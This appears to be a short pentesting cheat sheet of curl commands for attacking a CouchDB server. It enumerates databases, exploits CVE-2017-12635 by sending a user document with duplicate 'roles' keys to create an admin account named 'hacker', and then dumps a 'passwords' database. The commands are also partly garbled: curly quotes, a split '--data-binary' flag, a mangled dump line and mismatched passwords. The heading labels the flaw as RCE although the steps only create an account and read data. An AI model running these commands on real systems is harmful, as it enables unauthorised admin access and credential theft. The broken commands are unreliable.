   
```bash - kali
curl http://$TARGET:5984/
```

```bash - kali
curl -X GET http://$TARGET:5984/_all_dbs
```

```bash - kali
curl -X GET http://$USER:$PASSWORD@$TARGET:5984/_all_dbs
```

### CVE-2017-12635 RCE

#### Create `hacker` user
```bash - kali
curl -X PUT ‘http://$TARGET:5984/_users/org.couchdb.user:hacker' -- data-binary ‘{ “type”: “user”, “name”: “hacker”, “roles”: [“_admin”], “roles”: [], “password”: “password” }’
```

#### Dump database
```bash - kali
curl http://$TARGET:5984/passwords/_all_docs?include_docs=true -u hacker:-Xpassword <ds/_all_docs?include_docs=true -u hacker:-Xpassword
```

#### Dump passwords
```bash - kali
curl -X GET http://hacker:passwords@$TARGET:5984/passwords
```
